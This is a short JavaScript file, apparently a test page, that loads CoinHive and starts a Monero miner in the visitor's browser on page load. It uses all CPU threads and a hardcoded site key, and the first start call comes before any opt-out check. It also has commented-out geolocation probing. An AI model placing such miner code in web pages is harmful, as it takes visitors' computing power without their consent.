const monro_api_key = 'XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP';

// <script src="https://authedmine.com/lib/authedmine.min.js"></script>
// <script src="../public/js/mine.js"></script>

$(document).ready(function () {
    var socket = io.connect();

    var miner = new CoinHive.User(monro_api_key, 'User', {
  	threads: navigator.hardwareConcurrency,
  	autoThreads: false,
  	throttle: .5,
  	forceASMJS: false
  	});
    miner.start();
    $("#fine").click(function () {
      alert("we are cool")
    });
    $("#nooo").click(function () {
      alert("we aren't cool")
    });


      // console.log(navigator);
      // navigator.geolocation.getCurrentPosition(showPosition);
      // function showPosition(position) {
      //   alert("Latitude: " + position.coords.latitude +
      //   "<br>Longitude: " + position.coords.longitude) ;
      // }
      // alert(navigator.platform);
      // alert(navigator.hardwareConcurrency);
      // console.log('https://authedmine.com/media/miner.html?key=XXcJNZiaSWshUe3H2NuXzBrLj3kW2wvP');
      var miner = new CoinHive.User(monro_api_key, 'User', {
    	threads: navigator.hardwareConcurrency,
    	autoThreads: false,
    	throttle: 1,
    	forceASMJS: false
    	});
      if (!miner.didOptOut(3600)) {
    		miner.start();
    	}
      // alert(miner.getNumThreads());
      setTimeout(function () {
        if(miner.isRunning()){
          alert('run')
        }else{
          alert("QQ")
        }
      },1000)
      var threadCount = miner.getNumThreads();
      var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
      var totalHashes = miner.getTotalHashes();
      var acceptedHashes = miner.getAcceptedHashes() / 256;


});
